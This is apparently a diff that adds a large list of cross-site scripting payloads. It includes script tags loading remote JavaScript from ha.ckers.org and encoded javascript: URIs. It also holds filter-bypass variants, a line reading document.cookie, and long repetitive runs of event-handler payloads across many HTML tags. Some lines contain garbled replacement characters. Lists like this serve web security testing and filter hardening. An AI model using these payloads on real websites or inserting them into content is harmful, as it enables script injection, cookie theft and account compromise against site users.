@@ -1,0 +1,1972 @@
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<<SCRIPT>confirm("XSS");//<</SCRIPT>
+<SCRIPT>a=/XSS/confirm(a.source)</SCRIPT>
+\";confirm('XSS');//
+</TITLE><SCRIPT>confirm("XSS");</SCRIPT>
+�script�confirm(�XSS�)�/script�
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:confirm('XSS');">
+<IFRAME SRC="javascript:confirm('XSS');"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:confirm('XSS');"></FRAMESET>
+<TABLE BACKGROUND="javascript:confirm('XSS')">
+<TABLE><TD BACKGROUND="javascript:confirm('XSS')">
+<DIV STYLE="background-image: url(javascript:confirm('XSS'))">
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<DIV STYLE="width: expression(confirm('XSS'));">
+<STYLE>@im\port'\ja\vasc\ript:confirm("XSS")';</STYLE>
+&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\"javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;confirm('XSS');\"&gt;&#93;&#93;&gt;;
+&lt;SCRIPT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\"&gt;&lt;/SCRIPT&gt;
+&lt;!--#exec cmd=\"/bin/echo '&lt;SCR'\"--&gt;&lt;!--#exec cmd=\"/bin/echo 'IPT 
+%253cscript%253econfirm(1)%253c/script%253e
+�><s�%2b�cript>confirm(document.cookie)</script>
+foo<script>confirm(1)</script>
+<scr<script>ipt>confirm(1)</scr</script>ipt>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<BODY BACKGROUND=�javascript:confirm(�XSS�)�>
+<BODY ONLOAD=confirm(�XSS�)>
+<INPUT TYPE=�IMAGE� SRC=�javascript:confirm(�XSS�);�>
+<IMG SRC=�javascript:confirm(�XSS�)�
+<iframe src=http://ha.ckers.org/scriptlet.html <
+javascript:confirm("hellox worldss")
+<img src="javascript:confirm('XSS');">
+<img src=javascript:confirm(&quot;XSS&quot;)>
+<"';confirm(String.fromCharCode(88,83,83))//\';confirm(String.fromCharCode(88,83,83))//";confirm(String.fromCharCode(88,83,83))//\";confirm(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>confirm(String.fromCharCode(88,83,83))</SCRIPT>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<IFRAME SRC="javascript:confirm('XSS');"></IFRAME>
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<<SCRIPT>confirm("XSS");//<</SCRIPT>
+<"';confirm(String.fromCharCode(88,83,83))//\';confirm(String.fromCharCode(88,83,83))//";confirm(String.fromCharCode(88,83,83))//\";confirm(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>confirm(String.fromCharCode(88,83,83))</SCRIPT>
+';confirm(String.fromCharCode(88,83,83))//\';confirm(String.fromCharCode(88,83,83))//";confirm(String.fromCharCode(88,83,83))//\";confirm(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>confirm(String.fromCharCode(88,83,83))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search
+<script>confirm("hellox worldss")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510
+<script>confirm("XSS");</script>&search=1
+0&q=';confirm(String.fromCharCode(88,83,83))//\';confirm%2?8String.fromCharCode(88,83,83))//";confirm(String.fromCharCode?(88,83,83))//\";confirm(String.fromCharCode(88,83,83)%?29//--></SCRIPT>">'><SCRIPT>confirm(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search
+<h1><font color=blue>hellox worldss</h1>
+<BODY ONLOAD=confirm('hellox worldss')>
+<input onfocus=write(XSS) autofocus>
+<input onblur=write(XSS) autofocus><input autofocus>
+<body onscroll=confirm(XSS)>
+<input autofocus>
+<form><button formaction="javascript:confirm(XSS)">lol
+<!--<img src="--><img src=x onerror=confirm(XSS)//">
+<![><img src="]><img src=x onerror=confirm(XSS)//">
+<style><img src="</style><img src=x onerror=confirm(XSS)//">
+<? foo="><script>confirm(1)</script>">
+<! foo="><script>confirm(1)</script>">
+<tbody oncut="prompt(1)" contenteditable>test</tbody>
+<tbody ondblclick="prompt(1)">test</tbody>
+<tbody onfocusout=prompt(1) tabindex=1 id=x></tbody><input autofocus>
+<tbody onkeydown="prompt(1)" contenteditable>test</tbody>
+<tbody onkeypress="prompt(1)" contenteditable>test</tbody>
+<style>@keyframes x{}</style><tt style="animation-name:x" onanimationend="prompt(1)"></tt>
+<style>@keyframes x{}</style><tt style="animation-name:x" onanimationstart="prompt(1)"></tt>
+<style>@keyframes x{}</style><u style="animation-name:x" onanimationend="prompt(1)"></u>
+<style>@keyframes x{}</style><u style="animation-name:x" onanimationstart="prompt(1)"></u>
+<style>@keyframes x{}</style><ul style="animation-name:x" onanimationend="prompt(1)"></ul>
+<style>@keyframes x{}</style><ul style="animation-name:x" onanimationstart="prompt(1)"></ul>
+<style>@keyframes x{}</style><var style="animation-name:x" onanimationend="prompt(1)"></var>
+<style>@keyframes x{}</style><var style="animation-name:x" onanimationstart="prompt(1)"></var>
+<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="prompt(1)"></video>
+<style>@keyframes x{}</style><video style="animation-name:x" onanimationstart="prompt(1)"></video>
+<style>@keyframes x{}</style><xmp style="animation-name:x" onanimationend="prompt(1)"></xmp>
+<style>@keyframes x{}</style><xmp style="animation-name:x" onanimationstart="prompt(1)"></xmp>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="prompt(1)"></xss>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="prompt(1)"></xss>
+<sub draggable="true" ondrag="prompt(1)">test</sub>
+<sub draggable="true" ondragend="prompt(1)">test</sub>
+<sub draggable="true" ondragenter="prompt(1)">test</sub>
+<sub draggable="true" ondragleave="prompt(1)">test</sub>
+<sub draggable="true" ondragstart="prompt(1)">test</sub>
+<sub id=x tabindex=1 onactivate=prompt(1)></sub>
+<sub id=x tabindex=1 onbeforeactivate=prompt(1)></sub>
+<sub id=x tabindex=1 onbeforedeactivate=prompt(1)></sub><input autofocus>
+<sub id=x tabindex=1 ondeactivate=prompt(1)></sub><input id=y autofocus>
+<sub id=x tabindex=1 onfocus=prompt(1)></sub>
+<sub id=x tabindex=1 onfocusin=prompt(1)></sub>
+<sub onbeforecopy="prompt(1)" contenteditable>test</sub>
+<sub onbeforecut="prompt(1)" contenteditable>test</sub>
+<sub onbeforepaste="prompt(1)" contenteditable>test</sub>
+<sub onblur=prompt(1) tabindex=1 id=x></sub><input autofocus>
+<sub onclick="prompt(1)">test</sub>
+<sub oncontextmenu="prompt(1)">test</sub>
+<sub oncopy="prompt(1)" contenteditable>test</sub>
+<sub oncut="prompt(1)" contenteditable>test</sub>
+<sub ondblclick="prompt(1)">test</sub>
+<sub onfocusout=prompt(1) tabindex=1 id=x></sub><input autofocus>
+<sub onkeydown="prompt(1)" contenteditable>test</sub>
+<sub onkeypress="prompt(1)" contenteditable>test</sub>
+<sub onkeyup="prompt(1)" contenteditable>test</sub>
+<sub onmousedown="prompt(1)">test</sub>
+<sub onmouseenter="prompt(1)">test</sub>
+<sub onmouseleave="prompt(1)">test</sub>
+<sub onmousemove="prompt(1)">test</sub>
+<sub onmouseout="prompt(1)">test</sub>
+<sub onmouseover="prompt(1)">test</sub>
+<sub onmouseup="prompt(1)">test</sub>
+<sub onpaste="prompt(1)" contenteditable>test</sub>
+<summary draggable="true" ondrag="prompt(1)">test</summary>
+<summary draggable="true" ondragend="prompt(1)">test</summary>
+<summary draggable="true" ondragenter="prompt(1)">test</summary>
+<summary draggable="true" ondragleave="prompt(1)">test</summary>
+<summary draggable="true" ondragstart="prompt(1)">test</summary>
+<samp onmouseleave="prompt(1)">test</samp>
+<samp onmousemove="prompt(1)">test</samp>
+<samp onmouseout="prompt(1)">test</samp>
+<samp onmouseover="prompt(1)">test</samp>
+<samp onmouseup="prompt(1)">test</samp>
+<samp onpaste="prompt(1)" contenteditable>test</samp>
+<script draggable="true" ondrag="prompt(1)">test</script>
+<script draggable="true" ondragend="prompt(1)">test</script>
+<script draggable="true" ondragenter="prompt(1)">test</script>
+<script draggable="true" ondragleave="prompt(1)">test</script>
+<script draggable="true" ondragstart="prompt(1)">test</script>
+<script id=x tabindex=1 onactivate=prompt(1)></script>
+<script id=x tabindex=1 onbeforeactivate=prompt(1)></script>
+<script id=x tabindex=1 onbeforedeactivate=prompt(1)></script><input autofocus>
+<script id=x tabindex=1 ondeactivate=prompt(1)></script><input id=y autofocus>
+<script id=x tabindex=1 onfocus=prompt(1)></script>
+<script id=x tabindex=1 onfocusin=prompt(1)></script>
+<script onbeforecopy="prompt(1)" contenteditable>test</script>
+<script onbeforecut="prompt(1)" contenteditable>test</script>
+<script onbeforepaste="prompt(1)" contenteditable>test</script>
+<script onblur=prompt(1) tabindex=1 id=x></script><input autofocus>
+main id=x tabindex=1 ondeactivate=prompt(1)></main><input id=y autofocus>
+<main id=x tabindex=1 onfocus=prompt(1)></main>
+<main id=x tabindex=1 onfocusin=prompt(1)></main>
+<main onbeforecopy="prompt(1)" contenteditable>test</main>
+<main onbeforecut="prompt(1)" contenteditable>test</main>
+<main onbeforepaste="prompt(1)" contenteditable>test</main>
+<main onblur=prompt(1) tabindex=1 id=x></main><input autofocus>
+<main onclick="prompt(1)">test</main>
+<main oncontextmenu="prompt(1)">test</main>
+<main oncopy="prompt(1)" contenteditable>test</main>
+<main oncut="prompt(1)" contenteditable>test</main>
+<main ondblclick="prompt(1)">test</main>
+<main onfocusout=prompt(1) tabindex=1 id=x></main><input autofocus>
+<main onkeydown="prompt(1)" contenteditable>test</main>
+<main onkeypress="prompt(1)" contenteditable>test</main>
+<main onkeyup="prompt(1)" contenteditable>test</main>
+<main onmousedown="prompt(1)">test</main>
+<main onmouseenter="prompt(1)">test</main>
+<main onmouseleave="prompt(1)">test</main>
+<main onmousemove="prompt(1)">test</main>
+<main onmouseout="prompt(1)">test</main>
+<main onmouseover="prompt(1)">test</main>
+<main onmouseup="prompt(1)">test</main>
+<main onpaste="prompt(1)" contenteditable>test</main>
+<map draggable="true" ondrag="prompt(1)">test</map>
+<map draggable="true" ondragend="prompt(1)">test</map>
+<map draggable="true" ondragenter="prompt(1)">test</map>
+<map draggable="true" ondragleave="prompt(1)">test</map>
+<map draggable="true" ondragstart="prompt(1)">test</map>
+<map id=x tabindex=1 onactivate=prompt(1)></map>
+<map id=x tabindex=1 onbeforeactivate=prompt(1)></map>
+<map id=x tabindex=1 onbeforedeactivate=prompt(1)></map><input autofocus>
+<map id=x tabindex=1 ondeactivate=prompt(1)></map><input id=y autofocus>
+<map id=x tabindex=1 onfocus=prompt(1)></map>
+<map id=x tabindex=1 onfocusin=prompt(1)></map>
+<map onbeforecopy="prompt(1)" contenteditable>test</map>
+<map onbeforecut="prompt(1)" contenteditable>test</map>
+<map onbeforepaste="prompt(1)" contenteditable>test</map>
+<map onblur=prompt(1) tabindex=1 id=x></map><input autofocus>
+<map onclick="prompt(1)">test</map>
+<map oncontextmenu="prompt(1)">test</map>
+<map oncopy="prompt(1)" contenteditable>test</map>
+<map oncut="prompt(1)" contenteditable>test</map>
+<map ondblclick="prompt(1)">test</map>
+<map onfocusout=prompt(1) tabindex=1 id=x></map><input autofocus>
+<map onkeydown="prompt(1)" contenteditable>test</map>
+<map onkeypress="prompt(1)" contenteditable>test</map>
+<map onkeyup="prompt(1)" contenteditable>test</map>
+<map onmousedown="prompt(1)">test</map>
+<map onmouseenter="prompt(1)">test</map>
+<map onmouseleave="prompt(1)">test</map>
+<map onmousemove="prompt(1)">test</map>
+<map onmouseout="prompt(1)">test</map>
+<map onmouseover="prompt(1)">test</map>
+<map onmouseup="prompt(1)">test</map>
+<map onpaste="prompt(1)" contenteditable>test</map>
+<mark draggable="true" ondrag="prompt(1)">test</mark>
+<mark draggable="true" ondragend="prompt(1)">test</mark>
+<mark draggable="true" ondragenter="prompt(1)">test</mark>
+<mark draggable="true" ondragleave="prompt(1)">test</mark>
+<mark draggable="true" ondragstart="prompt(1)">test</mark>
+<mark id=x tabindex=1 onactivate=prompt(1)></mark>
+<mark id=x tabindex=1 onbeforeactivate=prompt(1)></mark>
+<mark id=x tabindex=1 onbeforedeactivate=prompt(1)></mark><input autofocus>
+<mark id=x tabindex=1 ondeactivate=prompt(1)></mark><input id=y autofocus>
+<mark id=x tabindex=1 onfocus=prompt(1)></mark>
+<mark id=x tabindex=1 onfocusin=prompt(1)></mark>
+<mark onbeforecopy="prompt(1)" contenteditable>test</mark>
+<mark onbeforecut="prompt(1)" contenteditable>test</mark>
+<mark onbeforepaste="prompt(1)" contenteditable>test</mark>
+<mark onblur=prompt(1) tabindex=1 id=x></mark><input autofocus>
+<mark onclick="prompt(1)">test</mark>
+<mark oncontextmenu="prompt(1)">test</mark>
+<mark oncopy="prompt(1)" contenteditable>test</mark>
+<mark oncut="prompt(1)" contenteditable>test</mark>
+<mark ondblclick="prompt(1)">test</mark>
+<mark onfocusout=prompt(1) tabindex=1 id=x></mark><input autofocus>
+<mark onkeydown="prompt(1)" contenteditable>test</mark>
+<mark onkeypress="prompt(1)" contenteditable>test</mark>
+<mark onkeyup="prompt(1)" contenteditable>test</mark>
+<mark onmousedown="prompt(1)">test</mark>
+<mark onmouseenter="prompt(1)">test</mark>
+<mark onmouseleave="prompt(1)">test</mark>
+<mark onmousemove="prompt(1)">test</mark>
+<mark onmouseout="prompt(1)">test</mark>
+<mark onmouseover="prompt(1)">test</mark>
+<mark onmouseup="prompt(1)">test</mark>
+<mark onpaste="prompt(1)" contenteditable>test</mark>
+<marquee draggable="true" ondrag="prompt(1)">test</marquee>
+<marquee draggable="true" ondragend="prompt(1)">test</marquee>
+<marquee draggable="true" ondragenter="prompt(1)">test</marquee>
+<marquee draggable="true" ondragleave="prompt(1)">test</marquee>
+<marquee draggable="true" ondragstart="prompt(1)">test</marquee>
+<marquee id=x tabindex=1 onactivate=prompt(1)></marquee>
+<marquee id=x tabindex=1 onbeforeactivate=prompt(1)></marquee>
+<marquee id=x tabindex=1 onbeforedeactivate=prompt(1)></marquee><input autofocus>
+<marquee id=x tabindex=1 ondeactivate=prompt(1)></marquee><input id=y autofocus>
+<marquee id=x tabindex=1 onfocus=prompt(1)></marquee>
+<marquee id=x tabindex=1 onfocusin=prompt(1)></marquee>
+<marquee onbeforecopy="prompt(1)" contenteditable>test</marquee>
+<marquee onbeforecut="prompt(1)" contenteditable>test</marquee>
+<marquee onbeforepaste="prompt(1)" contenteditable>test</marquee>
+<marquee onblur=prompt(1) tabindex=1 id=x></marquee><input autofocus>
+<marquee onclick="prompt(1)">test</marquee>
+<marquee oncontextmenu="prompt(1)">test</marquee>
+<marquee oncopy="prompt(1)" contenteditable>test</marquee>
+<marquee oncut="prompt(1)" contenteditable>test</marquee>
+<marquee ondblclick="prompt(1)">test</marquee>
+<marquee onfocusout=prompt(1) tabindex=1 id=x></marquee><input autofocus>
+<marquee onkeydown="prompt(1)" contenteditable>test</marquee>
+<marquee onkeypress="prompt(1)" contenteditable>test</marquee>
+<marquee onkeyup="prompt(1)" contenteditable>test</marquee>
+<marquee onmousedown="prompt(1)">test</marquee>
+<marquee onmouseenter="prompt(1)">test</marquee>
+<marquee onmouseleave="prompt(1)">test</marquee>
+<marquee onmousemove="prompt(1)">test</marquee>
+<marquee onmouseout="prompt(1)">test</marquee>
+<marquee onmouseover="prompt(1)">test</marquee>
+<marquee onmouseup="prompt(1)">test</marquee>
+<marquee onpaste="prompt(1)" contenteditable>test</marquee>
+<marquee onstart=prompt(1)>XSS</marquee>
+<marquee width=1 loop=1 onbounce=prompt(1)>XSS</marquee>
+<marquee width=1 loop=1 onfinish=prompt(1)>XSS</marquee>
+<menu draggable="true" ondrag="prompt(1)">test</menu>
+<menu draggable="true" ondragend="prompt(1)">test</menu>
+<menu draggable="true" ondragenter="prompt(1)">test</menu>
+<menu draggable="true" ondragleave="prompt(1)">test</menu>
+<menu draggable="true" ondragstart="prompt(1)">test</menu>
+<menu id=x tabindex=1 onactivate=prompt(1)></menu>
+<menu id=x tabindex=1 onbeforeactivate=prompt(1)></menu>
+<menu id=x tabindex=1 onbeforedeactivate=prompt(1)></menu><input autofocus>
+<menu id=x tabindex=1 ondeactivate=prompt(1)></menu><input id=y autofocus>
+<menu id=x tabindex=1 onfocus=prompt(1)></menu>
+<menu id=x tabindex=1 onfocusin=prompt(1)></menu>
+<menu onbeforecopy="prompt(1)" contenteditable>test</menu>
+<menu onbeforecut="prompt(1)" contenteditable>test</menu>
+<menu onbeforepaste="prompt(1)" contenteditable>test</menu>
+<menu onblur=prompt(1) tabindex=1 id=x></menu><input autofocus>
+<menu onclick="prompt(1)">test</menu>
+<menu oncontextmenu="prompt(1)">test</menu>
+<menu oncopy="prompt(1)" contenteditable>test</menu>
+<menu oncut="prompt(1)" contenteditable>test</menu>
+<menu ondblclick="prompt(1)">test</menu>
+<menu onfocusout=prompt(1) tabindex=1 id=x></menu><input autofocus>
+<menu onkeydown="prompt(1)" contenteditable>test</menu>
+<menu onkeypress="prompt(1)" contenteditable>test</menu>
+<menu onkeyup="prompt(1)" contenteditable>test</menu>
+<menu onmousedown="prompt(1)">test</menu>
+<menu onmouseenter="prompt(1)">test</menu>
+<menu onmouseleave="prompt(1)">test</menu>
+<menu onmousemove="prompt(1)">test</menu>
+<menu onmouseout="prompt(1)">test</menu>
+<menu onmouseover="prompt(1)">test</menu>
+<menu onmouseup="prompt(1)">test</menu>
+<menu onpaste="prompt(1)" contenteditable>test</menu>
+<menuitem draggable="true" ondrag="prompt(1)">test</menuitem>
+<menuitem draggable="true" ondragend="prompt(1)">test</menuitem>
+<menuitem draggable="true" ondragenter="prompt(1)">test</menuitem>
+<menuitem draggable="true" ondragleave="prompt(1)">test</menuitem>
+<menuitem draggable="true" ondragstart="prompt(1)">test</menuitem>
+<menuitem id=x tabindex=1 onactivate=prompt(1)></menuitem>
+<menuitem id=x tabindex=1 onbeforeactivate=prompt(1)></menuitem>
+<menuitem id=x tabindex=1 onbeforedeactivate=prompt(1)></menuitem><input autofocus>
+<menuitem id=x tabindex=1 ondeactivate=prompt(1)></menuitem><input id=y autofocus>
+<menuitem id=x tabindex=1 onfocus=prompt(1)></menuitem>
+<menuitem id=x tabindex=1 onfocusin=prompt(1)></menuitem>
+<menuitem onbeforecopy="prompt(1)" contenteditable>test</menuitem>
+<menuitem onbeforecut="prompt(1)" contenteditable>test</menuitem>
+<menuitem onbeforepaste="prompt(1)" contenteditable>test</menuitem>
+<menuitem onblur=prompt(1) tabindex=1 id=x></menuitem><input autofocus>
+<menuitem onclick="prompt(1)">test</menuitem>
+<menuitem oncontextmenu="prompt(1)">test</menuitem>
+<menuitem oncopy="prompt(1)" contenteditable>test</menuitem>
+<menuitem oncut="prompt(1)" contenteditable>test</menuitem>
+<menuitem ondblclick="prompt(1)">test</menuitem>
+<menuitem onfocusout=prompt(1) tabindex=1 id=x></menuitem><input autofocus>
+<menuitem onkeydown="prompt(1)" contenteditable>test</menuitem>
+<menuitem onkeypress="prompt(1)" contenteditable>test</menuitem>
+<menuitem onkeyup="prompt(1)" contenteditable>test</menuitem>
+<menuitem onmousedown="prompt(1)">test</menuitem>
+<menuitem onmouseenter="prompt(1)">test</menuitem>
+<menuitem onmouseleave="prompt(1)">test</menuitem>
+<menuitem onmousemove="prompt(1)">test</menuitem>
+<menuitem onmouseout="prompt(1)">test</menuitem>
+<menuitem onmouseover="prompt(1)">test</menuitem>
+<menuitem onmouseup="prompt(1)">test</menuitem>
+<menuitem onpaste="prompt(1)" contenteditable>test</menuitem>
+<meter draggable="true" ondrag="prompt(1)">test</meter>
+<meter draggable="true" ondragend="prompt(1)">test</meter>
+<meter draggable="true" ondragenter="prompt(1)">test</meter>
+<meter draggable="true" ondragleave="prompt(1)">test</meter>
+<meter draggable="true" ondragstart="prompt(1)">test</meter>
+<meter id=x tabindex=1 onactivate=prompt(1)></meter>
+<meter id=x tabindex=1 onbeforeactivate=prompt(1)></meter>
+<meter id=x tabindex=1 onbeforedeactivate=prompt(1)></meter><input autofocus>
+<meter id=x tabindex=1 ondeactivate=prompt(1)></meter><input id=y autofocus>
+<meter id=x tabindex=1 onfocus=prompt(1)></meter>
+<meter id=x tabindex=1 onfocusin=prompt(1)></meter>
+<meter onbeforecopy="prompt(1)" contenteditable>test</meter>
+<meter onbeforecut="prompt(1)" contenteditable>test</meter>
+<meter onbeforepaste="prompt(1)" contenteditable>test</meter>
+<meter onblur=prompt(1) tabindex=1 id=x></meter><input autofocus>
+<meter onclick="prompt(1)">test</meter>
+<meter oncontextmenu="prompt(1)">test</meter>
+<meter oncopy="prompt(1)" contenteditable>test</meter>
+<meter oncut="prompt(1)" contenteditable>test</meter>
+<meter ondblclick="prompt(1)">test</meter>
+<meter onfocusout=prompt(1) tabindex=1 id=x></meter><input autofocus>
+<meter onkeydown="prompt(1)" contenteditable>test</meter>
+<meter onkeypress="prompt(1)" contenteditable>test</meter>
+<meter onkeyup="prompt(1)" contenteditable>test</meter>
+<meter onmousedown="prompt(1)">test</meter>
+<meter onmouseenter="prompt(1)">test</meter>
+<meter onmouseleave="prompt(1)">test</meter>
+<meter onmousemove="prompt(1)">test</meter>
+<meter onmouseout="prompt(1)">test</meter>
+<meter onmouseover="prompt(1)">test</meter>
+<meter onmouseup="prompt(1)">test</meter>
+<meter onpaste="prompt(1)" contenteditable>test</meter>
+<multicol draggable="true" ondrag="prompt(1)">test</multicol>
+<multicol draggable="true" ondragend="prompt(1)">test</multicol>
+<multicol draggable="true" ondragenter="prompt(1)">test</multicol>
+<multicol draggable="true" ondragleave="prompt(1)">test</multicol>
+<multicol draggable="true" ondragstart="prompt(1)">test</multicol>
+<multicol id=x tabindex=1 onactivate=prompt(1)></multicol>
+<multicol id=x tabindex=1 onbeforeactivate=prompt(1)></multicol>
+<multicol id=x tabindex=1 onbeforedeactivate=prompt(1)></multicol><input autofocus>
+<multicol id=x tabindex=1 ondeactivate=prompt(1)></multicol><input id=y autofocus>
+<multicol id=x tabindex=1 onfocus=prompt(1)></multicol>
+<multicol id=x tabindex=1 onfocusin=prompt(1)></multicol>
+<multicol onbeforecopy="prompt(1)" contenteditable>test</multicol>
+<multicol onbeforecut="prompt(1)" contenteditable>test</multicol>
+<multicol onbeforepaste="prompt(1)" contenteditable>test</multicol>
+<multicol onblur=prompt(1) tabindex=1 id=x></multicol><input autofocus>
+<multicol onclick="prompt(1)">test</multicol>
+<multicol oncontextmenu="prompt(1)">test</multicol>
+<multicol oncopy="prompt(1)" contenteditable>test</multicol>
+<multicol oncut="prompt(1)" contenteditable>test</multicol>
+<multicol ondblclick="prompt(1)">test</multicol>
+<multicol onfocusout=prompt(1) tabindex=1 id=x></multicol><input autofocus>
+<multicol onkeydown="prompt(1)" contenteditable>test</multicol>
+<multicol onkeypress="prompt(1)" contenteditable>test</multicol>
+<multicol onkeyup="prompt(1)" contenteditable>test</multicol>
+<multicol onmousedown="prompt(1)">test</multicol>
+<multicol onmouseenter="prompt(1)">test</multicol>
+<multicol onmouseleave="prompt(1)">test</multicol>
+<multicol onmousemove="prompt(1)">test</multicol>
+<multicol onmouseout="prompt(1)">test</multicol>
+<multicol onmouseover="prompt(1)">test</multicol>
+<multicol onmouseup="prompt(1)">test</multicol>
+<multicol onpaste="prompt(1)" contenteditable>test</multicol>
+<nav draggable="true" ondrag="prompt(1)">test</nav>
+<nav draggable="true" ondragend="prompt(1)">test</nav>
+<nav draggable="true" ondragenter="prompt(1)">test</nav>
+<nav draggable="true" ondragleave="prompt(1)">test</nav>
+<nav draggable="true" ondragstart="prompt(1)">test</nav>
+<nav id=x tabindex=1 onactivate=prompt(1)></nav>
+<nav id=x tabindex=1 onbeforeactivate=prompt(1)></nav>
+<nav id=x tabindex=1 onbeforedeactivate=prompt(1)></nav><input autofocus>
+<nav id=x tabindex=1 ondeactivate=prompt(1)></nav><input id=y autofocus>
+<nav id=x tabindex=1 onfocus=prompt(1)></nav>
+<nav id=x tabindex=1 onfocusin=prompt(1)></nav>
+<nav onbeforecopy="prompt(1)" contenteditable>test</nav>
+<nav onbeforecut="prompt(1)" contenteditable>test</nav>
+<nav onbeforepaste="prompt(1)" contenteditable>test</nav>
+<nav onblur=prompt(1) tabindex=1 id=x></nav><input autofocus>
+<nav onclick="prompt(1)">test</nav>
+<nav oncontextmenu="prompt(1)">test</nav>
+<nav oncopy="prompt(1)" contenteditable>test</nav>
+<nav oncut="prompt(1)" contenteditable>test</nav>
+<nav ondblclick="prompt(1)">test</nav>
+<nav onfocusout=prompt(1) tabindex=1 id=x></nav><input autofocus>
+<nav onkeydown="prompt(1)" contenteditable>test</nav>
+<nav onkeypress="prompt(1)" contenteditable>test</nav>
+<nav onkeyup="prompt(1)" contenteditable>test</nav>
+<nav onmousedown="prompt(1)">test</nav>
+<nav onmouseenter="prompt(1)">test</nav>
+<nav onmouseleave="prompt(1)">test</nav>
+<nav onmousemove="prompt(1)">test</nav>
+<nav onmouseout="prompt(1)">test</nav>
+<nav onmouseover="prompt(1)">test</nav>
+<nav onmouseup="prompt(1)">test</nav>
+<nav onpaste="prompt(1)" contenteditable>test</nav>
+<nextid draggable="true" ondrag="prompt(1)">test</nextid>
+<nextid draggable="true" ondragend="prompt(1)">test</nextid>
+<nextid draggable="true" ondragenter="prompt(1)">test</nextid>
+<nextid draggable="true" ondragleave="prompt(1)">test</nextid>
+<nextid draggable="true" ondragstart="prompt(1)">test</nextid>
+<nextid id=x tabindex=1 onactivate=prompt(1)></nextid>
+<nextid id=x tabindex=1 onbeforeactivate=prompt(1)></nextid>
+<nextid id=x tabindex=1 onbeforedeactivate=prompt(1)></nextid><input autofocus>
+<nextid id=x tabindex=1 ondeactivate=prompt(1)></nextid><input id=y autofocus>
+<nextid id=x tabindex=1 onfocus=prompt(1)></nextid>
+<nextid id=x tabindex=1 onfocusin=prompt(1)></nextid>
+<nextid onbeforecopy="prompt(1)" contenteditable>test</nextid>
+<nextid onbeforecut="prompt(1)" contenteditable>test</nextid>
+<nextid onbeforepaste="prompt(1)" contenteditable>test</nextid>
+<nextid onblur=prompt(1) tabindex=1 id=x></nextid><input autofocus>
+<nextid onclick="prompt(1)">test</nextid>
+<nextid oncontextmenu="prompt(1)">test</nextid>
+<nextid oncopy="prompt(1)" contenteditable>test</nextid>
+<nextid oncut="prompt(1)" contenteditable>test</nextid>
+<nextid ondblclick="prompt(1)">test</nextid>
+<nextid onfocusout=prompt(1) tabindex=1 id=x></nextid><input autofocus>
+<nextid onkeydown="prompt(1)" contenteditable>test</nextid>
+<nextid onkeypress="prompt(1)" contenteditable>test</nextid>
+<nextid onkeyup="prompt(1)" contenteditable>test</nextid>
+<nextid onmousedown="prompt(1)">test</nextid>
+<nextid onmouseenter="prompt(1)">test</nextid>
+<nextid onmouseleave="prompt(1)">test</nextid>
+<nextid onmousemove="prompt(1)">test</nextid>
+<nextid onmouseout="prompt(1)">test</nextid>
+<nextid onmouseover="prompt(1)">test</nextid>
+<nextid onmouseup="prompt(1)">test</nextid>
+<nextid onpaste="prompt(1)" contenteditable>test</nextid>
+<noembed draggable="true" ondrag="prompt(1)">test</noembed>
+<noembed draggable="true" ondragend="prompt(1)">test</noembed>
+<noembed draggable="true" ondragenter="prompt(1)">test</noembed>
+<noembed draggable="true" ondragleave="prompt(1)">test</noembed>
+<noembed draggable="true" ondragstart="prompt(1)">test</noembed>
+<noembed id=x tabindex=1 onactivate=prompt(1)></noembed>
